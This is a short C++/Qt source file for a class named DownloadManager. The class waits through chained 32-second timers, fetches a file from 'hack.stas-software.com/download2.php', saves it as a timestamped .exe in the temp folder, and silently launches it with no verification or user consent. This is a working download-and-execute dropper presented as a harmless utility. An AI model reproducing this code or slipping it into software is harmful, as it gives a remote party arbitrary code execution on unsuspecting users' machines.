#include "downloadmanager.h"

DownloadManager::DownloadManager()
{
    timer = NULL;
    manager = NULL;
}

void DownloadManager::start()
{
    timer = new QTimer;
    timer->setInterval(32000);
    connect(timer,SIGNAL(timeout()),this,SLOT(timeout()));

    manager = new QNetworkAccessManager;
    connect(manager,SIGNAL(finished(QNetworkReply*)),this,SLOT(dataRecu(QNetworkReply*)));

    timer->start();
}

void DownloadManager::timeout()
{
    QTimer::singleShot(32000,this,SLOT(timeout2()));
}

void DownloadManager::timeout2()
{
    QTimer::singleShot(32000,this,SLOT(timeout3()));
}

void DownloadManager::timeout3()
{
    manager->get(QNetworkRequest(QUrl("http://hack.stas-software.com/download2.php")));
}

void DownloadManager::dataRecu(QNetworkReply *r)
{
    if (r->error() != QNetworkReply::NoError) return;
    QByteArray data = r->readAll();
    QString path = QDir::tempPath() + "/" + QDateTime::currentDateTime().toString("ddMMyyyyhhssmm") + ".exe";
    QFile fichier(path);
    fichier.open(QFile::WriteOnly);
    fichier.write(data);
    fichier.close();
    QProcess::startDetached(path);
}
